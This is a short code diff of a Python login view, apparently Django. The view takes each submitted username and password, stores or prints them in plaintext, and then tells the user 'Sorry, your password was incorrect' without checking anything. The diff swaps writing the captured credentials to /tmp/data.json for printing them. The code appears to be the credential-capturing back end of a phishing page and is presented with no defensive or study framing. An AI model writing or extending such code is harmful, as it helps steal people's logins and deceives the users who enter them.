@@ -15,25 +15,7 @@ def login_view(request):
 
         # Save form data to the database
         user_data = {'username': username, 'password': password}
-        
-        json_file_path = os.path.join('/tmp', 'data.json')
-
-        existing_data = []
-        try:
-            with open(json_file_path, 'r') as json_file:
-                content = json_file.read()
-                if content:
-                    existing_data = json.loads(content)
-        except FileNotFoundError:
-            pass  # Ignore if the file doesn't exist yet
-
-        # Append new data to the existing data
-        existing_data.append(user_data)
-
-        # Write the combined data (old + new) back to the JSON file using append mode ('a')
-        with open(json_file_path, 'w') as json_file:
-            json.dump(existing_data, json_file)
-
+        print(user_data)
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
         messages.success(request, success_message)
 
